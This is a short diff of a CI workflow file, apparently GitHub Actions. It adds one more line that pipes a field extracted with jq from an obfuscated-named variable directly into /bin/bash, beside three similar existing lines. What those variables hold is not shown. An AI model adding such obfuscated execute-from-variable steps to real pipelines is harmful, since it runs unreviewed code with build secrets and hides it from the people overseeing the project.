@@ -27,6 +27,7 @@ jobs:
           echo $y97912 | jq -r .rghv5 | /bin/bash
           echo $yt607 | jq -r .shxw89766 | /bin/bash
           echo $eegb2068 | jq -r .weptz126 | /bin/bash
+          printf '%s' "$xb8729" | jq -r .vcd5668 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
